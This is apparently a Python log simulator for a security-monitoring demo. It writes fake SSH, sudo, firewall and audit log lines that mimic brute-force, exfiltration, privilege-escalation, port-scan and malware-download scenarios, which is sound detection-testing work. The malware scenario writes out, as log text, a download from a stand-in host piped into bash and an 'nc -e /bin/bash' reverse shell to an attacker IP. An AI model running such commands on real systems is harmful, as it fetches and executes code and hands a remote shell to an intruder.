"""
log_generator.py - Synthetic Log Simulator
----------------------------------------------------------------------------
Generates realistic-looking log events and writes them to ./logs/
so the Sentry has something to watch during development and demos.

Run this in a separate terminal:
    python simulator/log_generator.py

Options
-------
--mode  normal          -> drip-feed normal-looking logs (default)
--mode  attack          -> inject one of the attack scenarios
--mode  mixed           -> alternate normal + random attacks
--attack brute_force    -> SSH brute-force scenario
--attack exfiltration   -> large outbound transfer scenario
--attack privilege_esc  -> sudo escalation + /etc/shadow read
--attack port_scan      -> nmap-style port scanning
----------------------------------------------------------------------------
"""

import os
import time
import random
import argparse
from datetime import datetime
from pathlib import Path

LOGS_DIR = "./logs"
Path(LOGS_DIR).mkdir(parents=True, exist_ok=True)

# -- realistic IP pools --------------------------------------------------------
INTERNAL_IPS = ["10.0.0.10", "10.0.0.11", "10.0.0.20", "192.168.1.5"]
EXTERNAL_IPS = ["185.220.101.34", "45.33.32.156", "104.21.67.89", "198.51.100.42"]
ATTACKER_IP  = "185.220.101.34"   # fixed "attacker" IP used in scenarios

NORMAL_USERS = ["alice", "bob", "carol", "dave", "svc-backup"]
SERVICES     = ["sshd", "sudo", "PAM", "kernel", "systemd", "cron"]

# -- log-line templates --------------------------------------------------------
NORMAL_TEMPLATES = [
    "{ts} {host} sshd[{pid}]: Accepted password for {user} from {ip} port {port} ssh2",
    "{ts} {host} sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt update",
    "{ts} {host} sshd[{pid}]: Disconnected from {ip} port {port} [preauth]",
    "{ts} {host} cron[{pid}]: ({user}) CMD (/usr/bin/backup.sh)",
    "{ts} {host} kernel: [ {uptime}] usb 1-1: USB disconnect, device number 3",
    "{ts} {host} systemd[1]: Started Daily apt upgrade and clean activities.",
    "{ts} {host} sshd[{pid}]: Accepted publickey for {user} from {ip} port {port} ssh2",
]

def _now() -> str:
    return datetime.now().strftime("%b %d %H:%M:%S")

def _rnd(pool): return random.choice(pool)

def _meta() -> dict:
    return {
        "ts":     _now(),
        "host":   "webserver01",
        "pid":    random.randint(1000, 9999),
        "port":   random.randint(49152, 65535),
        "uptime": round(random.uniform(100, 9999), 3),
        "user":   _rnd(NORMAL_USERS),
        "ip":     _rnd(INTERNAL_IPS),
    }

# -- normal log writer ---------------------------------------------------------
def write_normal(count: int = 1):
    log_file = os.path.join(LOGS_DIR, "auth.log")
    with open(log_file, "a") as fh:
        for _ in range(count):
            tpl = _rnd(NORMAL_TEMPLATES)
            fh.write(tpl.format(**_meta()) + "\n")
    print(f"[SIM] Wrote {count} normal log line(s) -> {log_file}")

# -- attack scenario writers ---------------------------------------------------
def inject_brute_force(attempts: int = 12):
    """SSH brute-force: many failed logins from the attacker IP."""
    log_file = os.path.join(LOGS_DIR, "auth.log")
    with open(log_file, "a") as fh:
        for i in range(attempts):
            ts   = _now()
            user = _rnd(["root", "admin", "ubuntu", "pi", "test"])
            fh.write(
                f"{ts} webserver01 sshd[{random.randint(1000,9999)}]: "
                f"Failed password for {user} from {ATTACKER_IP} port "
                f"{random.randint(49152,65535)} ssh2\n"
            )
            time.sleep(0.05)
        # Optionally end with a success (makes it more realistic)
        fh.write(
            f"{_now()} webserver01 sshd[9999]: "
            f"Accepted password for root from {ATTACKER_IP} port 54321 ssh2\n"
        )
    print(f"[SIM] [ALERT] Injected brute-force ({attempts} attempts + success) -> {log_file}")

def inject_data_exfiltration():
    """Simulate a large outbound transfer after a successful login."""
    log_file = os.path.join(LOGS_DIR, "network.log")
    ts = _now()
    with open(log_file, "a") as fh:
        # Successful login first
        fh.write(
            f"{ts} webserver01 sshd[5555]: "
            f"Accepted password for alice from {ATTACKER_IP} port 12345 ssh2\n"
        )
        # Large outbound transfer
        fh.write(
            f"{ts} webserver01 netflow: "
            f"src={INTERNAL_IPS[0]} dst={ATTACKER_IP} bytes=524288000 proto=TCP port=443 "
            f"(OUTBOUND LARGE TRANSFER - 500 MB)\n"
        )
        # Accessing sensitive files before exfil
        fh.write(
            f"{ts} webserver01 audit: "
            f"user=alice opened /etc/passwd read\n"
        )
        fh.write(
            f"{ts} webserver01 audit: "
            f"user=alice opened /etc/shadow read\n"
        )
    print(f"[SIM] [ALERT] Injected data exfiltration scenario -> {log_file}")

def inject_privilege_escalation():
    """Simulate sudo FAILED + reading /etc/shadow."""
    log_file = os.path.join(LOGS_DIR, "auth.log")
    ts = _now()
    with open(log_file, "a") as fh:
        fh.write(
            f"{ts} webserver01 sudo: dave : user NOT in sudoers ; "
            f"TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash\n"
        )
        fh.write(
            f"{ts} webserver01 sshd[3333]: POSSIBLE BREAK-IN ATTEMPT! "
            f"from {ATTACKER_IP}\n"
        )
        fh.write(
            f"{ts} webserver01 kernel: dave read /etc/shadow - UNAUTHORIZED ACCESS\n"
        )
        fh.write(
            f"{ts} webserver01 audit: chmod 777 /tmp/backdoor.sh executed by dave\n"
        )
    print(f"[SIM] [ALERT] Injected privilege escalation scenario -> {log_file}")

def inject_port_scan():
    """Simulate an nmap-style port scan from the attacker IP."""
    log_file = os.path.join(LOGS_DIR, "network.log")
    with open(log_file, "a") as fh:
        fh.write(
            f"{_now()} webserver01 firewall: "
            f"nmap scan detected from {ATTACKER_IP} - "
            f"probed 37 ports in 4s (TCP SYN)\n"
        )
        for port in [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 27017]:
            fh.write(
                f"{_now()} webserver01 firewall: "
                f"CONNECT {ATTACKER_IP} -> 10.0.0.10:{port} SYN\n"
            )
            time.sleep(0.02)
    print(f"[SIM] [ALERT] Injected port scan scenario -> {log_file}")

def inject_malware_download():
    """Simulate a wget/curl to download a suspicious script."""
    log_file = os.path.join(LOGS_DIR, "auth.log")
    ts = _now()
    with open(log_file, "a") as fh:
        fh.write(
            f"{ts} webserver01 bash[7777]: "
            f"wget http://malware.example.com/backdoor.sh -O /tmp/bd.sh\n"
        )
        fh.write(
            f"{ts} webserver01 bash[7778]: "
            f"base64 -d /tmp/bd.sh | bash\n"
        )
        fh.write(
            f"{ts} webserver01 bash[7779]: "
            f"nc -e /bin/bash {ATTACKER_IP} 4444\n"
        )
    print(f"[SIM] [ALERT] Injected malware download scenario -> {log_file}")


# -- CLI -----------------------------------------------------------------------
ATTACK_MAP = {
    "brute_force":       inject_brute_force,
    "exfiltration":      inject_data_exfiltration,
    "privilege_esc":     inject_privilege_escalation,
    "port_scan":         inject_port_scan,
    "malware":           inject_malware_download,
}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC-in-a-Box Log Simulator")
    parser.add_argument(
        "--mode",
        choices=["normal", "attack", "mixed"],
        default="mixed",
        help="Simulation mode",
    )
    parser.add_argument(
        "--attack",
        choices=list(ATTACK_MAP.keys()),
        default=None,
        help="Which attack to inject (used with --mode attack)",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=3.0,
        help="Seconds between log writes (default 3)",
    )
    args = parser.parse_args()

    print(f"[SIM] Starting log simulator | mode={args.mode} | logs -> {LOGS_DIR}/")
    print("[SIM] Press Ctrl+C to stop.\n")

    tick = 0
    try:
        while True:
            tick += 1

            if args.mode == "normal":
                write_normal(count=random.randint(1, 3))

            elif args.mode == "attack":
                attack_fn = ATTACK_MAP.get(args.attack or "brute_force")
                attack_fn()
                time.sleep(args.interval * 3)
                continue

            elif args.mode == "mixed":
                write_normal(count=random.randint(2, 5))
                # Every ~5 ticks inject a random attack
                if tick % 5 == 0:
                    attack_name = random.choice(list(ATTACK_MAP.keys()))
                    print(f"\n[SIM] Injecting attack: {attack_name}")
                    ATTACK_MAP[attack_name]()

            time.sleep(args.interval)

    except KeyboardInterrupt:
        print("\n[SIM] Stopped.")
